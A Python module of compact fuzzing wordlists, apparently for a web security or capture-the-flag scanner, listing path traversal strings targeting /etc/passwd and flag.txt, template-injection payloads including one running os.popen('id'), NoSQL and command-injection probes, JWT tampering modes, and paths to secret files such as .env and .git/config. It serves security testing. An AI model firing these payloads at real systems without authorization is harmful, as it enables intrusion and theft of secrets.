"""Bundled fuzz corpora — compact by default, override with --wordlist."""

from __future__ import annotations

# Path traversal payloads (compact corpus).
PATH_TRAVERSAL = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../flag.txt",
    "..%2fflag.txt",
    "..%252fflag.txt",
    "..\\flag.txt",
    "/etc/passwd",
    "static../flag.txt",
]

# SSTI marker payloads — request and observe interpretation.
SSTI_MARKERS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
]

# NoSQL injection payloads (JSON form).
NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
]

# Command injection metacharacter probes.
CMD_INJECTION = [
    "; id",
    "| id",
    "&& id",
    "`id`",
    "$(id)",
    "%0aid",
]

# JWT tampering modes.
JWT_TAMPERS = [
    "alg-none",
    "kid-injection",
    "rsa-to-hs256",
    "weak-hmac-bruteforce",
]

# Common file-disclosure paths.
COMMON_FILES = [
    ".env",
    ".git/config",
    "package.json",
    "composer.json",
    "requirements.txt",
    "robots.txt",
    "phpinfo.php",
    "server-status",
    "swagger.json",
    "openapi.json",
]

# Default endpoint discovery wordlist (very compact).
DIRBUSTER_TOP = [
    "admin",
    "api",
    "debug",
    "test",
    "dev",
    "internal",
    "metrics",
    "actuator",
    "swagger",
    "openapi.json",
    "health",
    "status",
    "robots.txt",
    ".git/config",
    ".env",
]
